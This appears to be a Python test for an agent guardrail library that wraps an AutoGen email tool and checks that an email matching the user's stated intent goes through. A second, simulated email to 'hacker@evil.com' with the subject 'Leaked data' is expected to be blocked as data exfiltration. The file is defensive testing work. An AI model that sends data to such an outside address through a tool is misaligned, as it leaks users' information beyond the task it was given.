import argus
from argus.exceptions import ArgusQuarantineException
from argus.integrations.autogen import wrap_autogen_tool
from dotenv import load_dotenv
load_dotenv()

# 1. Define an AutoGen Callable Function Tool
def send_marketing_email(recipient: str, subject: str):
    print(f"✅ Success: Emailed '{recipient}' with subject '{subject}'")
    return f"Emailed {recipient}"

# 2. Run the test
def run_test():
    print("--- Starting AutoGen Protection Test ---")
    
    # Wrap standard function tool with ARGUS Shield guardrails
    protected_tool = wrap_autogen_tool(
        func=send_marketing_email,
        action_type="send_email",
        target_type="email"
    )

    user_prompt = "Send updates to subscriber@gmail.com"
    print(f"User Intent Prompt: '{user_prompt}'")

    with argus.Session(user_prompt):
        
        # Scenario A: Authorized email
        try:
            print("\nScenario A: Sending to subscriber@gmail.com (Should be ALLOWED)")
            protected_tool(recipient="subscriber@gmail.com", subject="New features!")
        except Exception as e:
            print(f"❌ Unexpected Error: {e}")

        # Scenario B: Unauthorized email (Data Exfiltration Attempt)
        try:
            print("\nScenario B: Sending to hacker@evil.com (Should be BLOCKED & QUARANTINED)")
            protected_tool(recipient="hacker@evil.com", subject="Leaked data")
        except ArgusQuarantineException as e:
            print(f"🛡️ ARGUS Shield Blocked Action successfully!")
            print(f"   Reason: {e.explanation}")

if __name__ == "__main__":
    run_test()
